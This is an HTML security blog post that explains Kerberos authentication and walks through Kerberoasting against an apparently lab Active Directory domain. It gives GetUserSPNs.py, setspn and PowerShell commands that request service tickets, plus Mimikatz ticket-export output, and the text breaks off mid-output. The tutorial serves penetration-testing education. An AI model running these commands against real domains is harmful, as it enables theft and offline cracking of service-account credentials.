<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Kerberos | Malw0re</title><meta name="author" content="Malw0re"><meta name="copyright" content="Malw0re"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Active Directory kerberos">
<meta property="og:type" content="article">
<meta property="og:title" content="Kerberos">
<meta property="og:url" content="https://malw0re.github.io/malwore.github.io/2023/07/13/kerberos-101/index.html">
<meta property="og:site_name" content="Malw0re">
<meta property="og:description" content="Active Directory kerberos">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://malw0re.github.io/malwore.github.io/images/qwe.png">
<meta property="article:published_time" content="2023-07-12T21:00:00.000Z">
<meta property="article:modified_time" content="2024-11-03T14:22:02.148Z">
<meta property="article:author" content="Malw0re">
<meta property="article:tag" content="Active-Directory">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://malw0re.github.io/malwore.github.io/images/qwe.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Kerberos",
  "url": "https://malw0re.github.io/malwore.github.io/2023/07/13/kerberos-101/",
  "image": "https://malw0re.github.io/malwore.github.io/images/qwe.png",
  "datePublished": "2023-07-12T21:00:00.000Z",
  "dateModified": "2024-11-03T14:22:02.148Z",
  "author": [
    {
      "@type": "Person",
      "name": "Malw0re",
      "url": "https://malw0re.github.io/malwore.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/malwore.github.io/img/favicon.png"><link rel="canonical" href="https://malw0re.github.io/malwore.github.io/2023/07/13/kerberos-101/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/malwore.github.io/css/index.css?v=5.5.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/malwore.github.io/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Kerberos',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/malwore.github.io/images/qwe.png" onerror="this.onerror=null;this.src='/malwore.github.io/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/malwore.github.io/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/malwore.github.io/tags/"><div class="headline">Tags</div><div class="length-num">13</div></a><a href="/malwore.github.io/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/malwore.github.io/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/malwore.github.io/images/cyberpunk-red.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/malwore.github.io/"><span class="site-name">Malw0re</span></a><a class="nav-page-title" href="/malwore.github.io/"><span class="site-name">Kerberos</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/malwore.github.io/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/categories/writeups/"><i class="fa-fw fas fa-folder-open"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/malwore.github.io/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Kerberos</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-12T21:00:00.000Z" title="Created 2023-07-13 00:00:00">2023-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-03T14:22:02.148Z" title="Updated 2024-11-03 17:22:02">2024-11-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png"></p>
<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.</p>
<p><em>NB</em> [<strong><strong>kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network</strong>]</strong></p>
<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png"></p>
<h3 id="How-Kerb-Auth-works"><a href="#How-Kerb-Auth-works" class="headerlink" title="How Kerb Auth works!"></a>How Kerb Auth works!</h3><p>In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.</p>
<p><img src="https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png" alt="1.webp"></p>
<p>Kerberos uses symmetric cryptography for encryption and decryption.</p>
<p>For explanation purposes, we use three colours to distinguish Hashes:</p>
<ul>
<li><strong>BLUE _KEY</strong>: User NTLM HASH</li>
<li><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</li>
<li><strong>RED_KEY:</strong> Service NTLM HASH</li>
</ul>
<p><strong>Step 1:</strong> By sending the request message to KDC, the client initializes communication as:</p>
<p><em><strong>KRB_AS_REQ contains the following:</strong></em></p>
<ul>
<li>The username of the client is to be authenticated.</li>
<li><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with the Krbtgt account</em></li>
<li><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></li>
</ul>
<p>The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</p>
<p><strong>Step 2:</strong> The KDC uses a database consisting of Users&#x2F;Krbtgt&#x2F;Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</p>
<p>Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</p>
<p><em><strong>KRB_AS_REP contains the following:</strong></em></p>
<ul>
<li><em><strong>Username</strong></em></li>
<li><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></li>
<li><em>Session key</em></li>
<li><em>The expiration date of TGT</em></li>
<li><em><strong>TGT</strong>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></li>
<li><em>Username</em></li>
<li><em>Session key</em></li>
<li><em>The expiration date of TGT</em></li>
<li><em>PAC with user privileges, signed by KDC</em></li>
</ul>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA&#x2F;s16000&#x2F;2.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Step 3:</strong> The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</p>
<p><em><strong>KRB_TGS_REQ</strong> contains:</em></p>
<ul>
<li><em>Encrypted data with the session key</em></li>
<li><em>Username</em></li>
<li><em>Timestamp</em></li>
<li><em>TGT</em></li>
<li><em>SPN of requested service e.g. SQL service</em></li>
</ul>
<p><strong>Step 4:</strong> The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash <strong>(Locked with Red Key)</strong> &amp; Some Encrypted Message using User Hash.</p>
<p><em><strong>KRB_TGS_REP contains:</strong></em></p>
<ul>
<li><em>Username</em></li>
<li><em>Encrypted data with the session key:</em></li>
<li><em>Service session key</em></li>
<li><em>The expiration date of TGS</em></li>
<li><em><strong>TGS</strong>, (Service Hash: RED Key) which contains:</em></li>
<li><em>Service session key</em></li>
<li><em>Username</em></li>
<li><em>The expiration date of TGS</em></li>
<li><em>PAC with user privileges, signed by KDC</em></li>
</ul>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw&#x2F;s16000&#x2F;3.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<p><strong>Step 5:</strong> The user sends the copy of TGS to the Application Server,</p>
<p><em><strong>KRB_AP_REQ contains:</strong></em></p>
<ul>
<li><em>TGS</em></li>
<li><em>Encrypted data with the service session key:</em></li>
<li><em>Username</em></li>
<li><em>Timestamp, to avoid replay attacks</em></li>
</ul>
<p><strong>Step 6:</strong> The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</p>
<p><strong>Step 7:</strong>  KDC verifies PAC (Optional)</p>
<p><strong>Step 8:</strong>  Allow the user to access the service for a specific time.</p>
<h2 id="SPNs"><a href="#SPNs" class="headerlink" title="SPNs"></a>SPNs</h2><p>The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</p>
<p><strong>Important Points</strong></p>
<ul>
<li>If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.</li>
<li>Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</li>
<li>A given SPN can be registered on only one account.</li>
<li>An SPN must be unique in the forest in which it is registered.</li>
<li>If it is not unique, authentication will fail.</li>
</ul>
<h3 id="SPNS-syntax"><a href="#SPNS-syntax" class="headerlink" title="SPNS syntax"></a>SPNS syntax</h3><p><strong>The SPN syntax has four elements</strong></p>
<p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ&#x2F;s16000&#x2F;5.png?w&#x3D;640&amp;ssl&#x3D;1"></p>
<h3 id="Type-of-SPN"><a href="#Type-of-SPN" class="headerlink" title="Type of SPN"></a>Type of SPN</h3><ul>
<li>Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks</li>
<li>SPNs that have been associated with a domain user account where NTLM hash will be used.</li>
</ul>
<h3 id="Linux-Perspective"><a href="#Linux-Perspective" class="headerlink" title="Linux Perspective"></a>Linux Perspective</h3><h4 id="Attack-Procedure"><a href="#Attack-Procedure" class="headerlink" title="Attack Procedure."></a>Attack Procedure.</h4><p>Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.</p>
<ul>
<li>From a non-domain joined Linux host using valid domain user credentials.</li>
<li>From a domain-joined Linux host as root after retrieving the keytab file.</li>
<li>From a domain-joined Windows, the host is authenticated as a domain user.</li>
<li>From a domain-joined Windows host with a shell in the context of a domain account.</li>
<li>As SYSTEM on a domain-joined Windows host.</li>
<li>From a non-domain joined Windows host using <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)">runas</a> &#x2F;netonly.</li>
</ul>
<h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools."></a>Tools.</h4><p>Some tools can be utilized to perform the attack.</p>
<ul>
<li>Impacket’s <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a> from a non-domain joined Linux host.</li>
<li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>
<li>From Windows, utilizing tools such as PowerView, <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>, and other PowerShell scripts.</li>
</ul>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>Obtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.</p>
<p>TGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.</p>
<h4 id="The-efficiency-of-Attack"><a href="#The-efficiency-of-Attack" class="headerlink" title="The efficiency of Attack"></a>The efficiency of Attack</h4><p>While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.</p>
<p>We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.</p>
<p><strong>N&#x2F;B -</strong> When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>REMEMBER!!!</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</p>
<h4 id="GetUserSPNs-py"><a href="#GetUserSPNs-py" class="headerlink" title="GetUserSPNs.py"></a>GetUserSPNs.py</h4><p><strong>Listing SPN Accounts.</strong></p>
<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></p>
<h4 id="Requesting-all-TGS-tickets"><a href="#Requesting-all-TGS-tickets" class="headerlink" title="Requesting all TGS tickets.**"></a>Requesting all TGS tickets.**</h4><p>Later on, we can pull all TGS tickets for offline processing using the <strong>-request</strong> flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.</p>
<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></p>
<h4 id="Requesting-a-Single-TGS-Ticket"><a href="#Requesting-a-Single-TGS-Ticket" class="headerlink" title="Requesting a Single TGS Ticket."></a>Requesting a Single TGS Ticket.</h4><p>Wte can also be more targeted and request just the TGS ticket for a specific account. Let’s try requesting one for just the required account.</p>
<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user</code></p>
<p>With this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.</p>
<p>Saving the Ticket o facilitate offline cracking, it is always good to use the <code>-outputfile</code> flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.</p>
<p><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></p>
<h3 id="Windows-Perspective"><a href="#Windows-Perspective" class="headerlink" title="Windows Perspective"></a>Windows Perspective</h3><p>Kerberoasting - Semi-Manual Method.</p>
<h4 id="Enumerating-SPNs-with-setspn-exe"><a href="#Enumerating-SPNs-with-setspn-exe" class="headerlink" title="Enumerating SPNs with setspn.exe"></a>Enumerating SPNs with setspn.exe</h4><p><code>setspn.exe -Q */*</code> running the command you’ll notice many different SPNs returned for the various hosts in the domain.</p>
<h4 id="Retrieving-All-Tickets-using-setspn-exe"><a href="#Retrieving-All-Tickets-using-setspn-exe" class="headerlink" title="Retrieving All Tickets using setspn.exe"></a>Retrieving All Tickets using setspn.exe</h4><p><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></p>
<p>The above command combines the previous command with <code>setspn.exe</code> to request tickets for all accounts with SPNs set.</p>
<p>Using <strong><strong><strong><strong><strong><strong><strong><strong><strong>Powershell</strong></strong></strong></strong></strong></strong></strong></strong></strong> we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using <strong>Mimkatz.</strong></p>
<h4 id="Targeting-a-Single-User"><a href="#Targeting-a-Single-User" class="headerlink" title="Targeting a Single User**************"></a>Targeting a Single User**************</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span></span><br></pre></td></tr></table></figure>
<p>Before moving on, let’s break down the commands above to see what we are doing (which is essentially what is used by <a target="_blank" rel="noopener" href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Rubeus</a> when using the default Kerberoasting method):</p>
<ul>
<li>The <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2">Add-Type</a> cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object</li>
<li>The <code>AssemblyName</code> parameter allows us to specify an assembly that contains types that we are interested in using</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8">System.IdentityModel</a> is a namespace that contains different classes for building security token services</li>
<li>We’ll then use the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2">New-Object</a> cmdlet to create an instance of a .NET Framework object</li>
<li>We’ll use the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8">System.IdentityModel.Tokens</a> namespace with the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8">KerberosRequestorSecurityToken</a> class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session</li>
</ul>
<p>We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.</p>
<p>Now that the tickets are loaded, we can use <code>Mimikatz</code> to extract the ticket(s) from <code>memory</code>.</p>
<h3 id="Extracting-Tickets-from-Memory-with-Mimikatz"><a href="#Extracting-Tickets-from-Memory-with-Mimikatz" class="headerlink" title="Extracting Tickets from Memory with Mimikatz"></a>Extracting Tickets from Memory with Mimikatz</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Using</span> <span class="string">&#x27;mimikatz.log&#x27;</span> for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># base64 /out:true</span></span><br><span class="line">isBase64InterceptInput  is false</span><br><span class="line">isBase64InterceptOutput is true</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list /export</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[<span class="number">00000002</span>] - <span class="number">0</span>x00000017 - rc4_hmac_nt</span><br><span class="line">   <span class="built_in">Start</span>/<span class="keyword">End</span>/MaxRenew: <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">36</span>:<span class="number">22</span> PM ; <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">55</span>:<span 